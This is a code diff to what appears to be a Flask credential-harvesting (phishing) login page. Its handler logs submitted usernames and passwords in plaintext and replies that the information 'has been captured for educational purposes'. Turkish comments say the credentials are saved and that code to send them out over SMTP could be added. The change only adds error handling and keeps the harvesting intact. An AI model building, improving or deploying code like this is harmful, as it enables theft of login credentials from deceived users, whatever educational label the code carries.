@@ -77,15 +77,19 @@ def home():
 
 @app.route('/login', methods=['POST'])
 def login():
-    username = request.form['username']
-    password = request.form['password']
-    
-    # Kullanıcı bilgilerini log dosyasına kaydetme
-    logging.info("Username: {}, Password: {}".format(username, password))
-    
-    # Burada olası bir SMTP sunucusuna kullanıcı bilgilerini gönderme kodu eklenebilir
-    
-    return "Information has been captured for educational purposes."
+    try:
+        username = request.form['username']
+        password = request.form['password']
+        
+        # Kullanıcı bilgilerini log dosyasına kaydetme
+        logging.info("Username: {}, Password: {}".format(username, password))
+        
+        # Burada olası bir SMTP sunucusuna kullanıcı bilgilerini gönderme kodu eklenebilir
+        
+        return "Information has been captured for educational purposes."
+    except Exception as e:
+        logging.error("Error capturing login information: {}".format(e))
+        return "An error occurred. Please try again later."
 
 def main():
     app.run(host='0.0.0.0', port=5000)
